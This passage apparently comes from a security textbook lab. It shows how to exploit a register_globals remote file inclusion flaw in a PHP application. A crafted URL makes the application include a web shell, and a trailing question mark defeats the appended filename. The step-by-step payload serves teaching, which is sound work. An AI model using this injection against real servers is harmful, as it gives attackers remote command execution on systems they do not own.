We created a file called shell.php in Chapter 5, Introduction to Web Scripting with PHP. If we copy that file to shell.txt, we are ready to exploit our vulnerability. The $master['currentskin'] variable is what we need to control. To control this variable, we need to formulate a GET request that will cause variable to be set by register_globals. When we go to the URL http://localhost/alp/include/_bot.php?master%5BCurrentskin%5D=http://localhost/shell.txt? we should see our shell as shown in Fig. 9.12. Our shell is included in the vulnerable application because we have given the URL to the file, and followed it with a question mark. Without the question mark, this will not work: The require line is appending the _bot.php directive. By using the query mark, we treat the _bot.php as an option passed to the script. We should now have a working shell on our server.
